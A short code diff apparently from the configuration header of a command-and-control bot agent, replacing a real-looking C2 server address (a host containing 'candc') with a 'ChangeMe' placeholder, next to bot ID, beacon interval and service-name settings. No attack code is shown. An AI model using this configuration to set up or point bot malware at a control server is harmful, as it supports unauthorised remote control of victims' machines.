@@ -36,7 +36,7 @@
 *****************************************************************************/
 
 // config
-#define SERVER_URL "http://4R35.candc.efflam.net:8443"
+#define SERVER_URL "http://4R35.ChangeMe.ChangeMe.net:8443"
 #define BOT_ID ""
 #define SLEEP_INTERVAL 10
 #define SERVICE_NAME "agent_4R35"
